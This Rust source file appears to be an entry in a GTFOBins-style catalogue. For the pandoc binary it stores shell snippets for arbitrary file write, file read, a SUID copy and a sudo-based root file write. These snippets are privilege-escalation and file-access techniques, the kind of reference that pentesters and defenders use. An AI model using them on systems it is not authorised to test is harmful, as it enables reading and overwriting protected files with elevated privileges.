pub static BIN_NAME: &'static str = "pandoc";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    echo DATA | pandoc -t plain -o "$LFILE"
"#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    pandoc -t plain "$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which pandoc) .

    LFILE=file_to_write
    echo DATA | ./pandoc -t plain -o "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_write
    echo DATA | sudo pandoc -t plain -o "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
